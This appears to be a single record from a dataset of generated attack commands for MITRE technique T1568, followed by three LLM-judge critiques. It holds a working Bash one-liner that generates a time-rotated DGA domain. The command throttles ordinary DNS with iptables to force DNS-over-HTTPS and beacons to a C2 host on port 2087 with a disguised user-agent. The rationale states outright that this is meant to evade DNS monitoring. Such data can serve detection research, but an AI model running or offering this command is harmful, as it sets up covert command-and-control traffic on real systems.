command: SEED="zeta"; LABEL=$(printf "%s" "${SEED}$(date -u +%Y%m%d%H)" | sha1sum | cut -c1-10); FQDN="${LABEL}.cache-sync.biz"; PORT=2087; iptables -A OUTPUT -p udp --dport 53 -m statistic --mode random --probability 0.7 -j DROP; sleep $((RANDOM%5)); curl -sSf --doh-url https://1.1.1.1/dns-query --user-agent "curl/$(curl --version | awk 'NR==1{print $2}')" "https://${FQDN}:${PORT}/beacon?load=$(uptime | awk '{print $10}')"
explanation: Curtails traditional DNS egress to prefer DoH and resolves a time-rotated DGA domain, then beacons over port 2087 with a realistic curl user-agent.
rationale_steps: Throttle UDP/53 to reduce observable DNS
Resolve via DoH to bypass local DNS
Beacon to C2 on nonstandard port 2087

llm_judgments.syntactic_justification: Well-formed Bash with balanced quoting, valid substitutions, and appropriate flags/pipelines.
llm_judgments.semantic_justification: Implements a time-based DGA resolved via DoH and attempts beaconing, but iptables requires root (likely failing) and the target endpoint/cert may not exist, so DNS curtailment and successful beaconing are not guaranteed.

llm_judgments.syntactic_justification: The command is well-formed with balanced quotes and valid separators, though the nested command substitution in --user-agent and the awk uptime field reference ($10 for load average may be wrong depending on uptime format) introduce minor edge-case fragility.
llm_judgments.semantic_justification: The command accurately implements T1568 by combining a time-seeded SHA1-based DGA to generate a rotating FQDN, suppressing traditional DNS via iptables to force DoH resolution through 1.1.1.1, adding jitter via random sleep, and beaconing over a non-standard port (2087) with a realistic user-agent, all of which are hallmark behaviors of dynamic resolution C2.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct shell variable assignments, subshell executions, and valid flag usage for curl and iptables.
llm_judgments.semantic_justification: The command accurately demonstrates T1568 by algorithmically generating a domain based on time and a seed; however, the use of iptables requires root privileges which contradicts the 'Privilege: None' metadata.
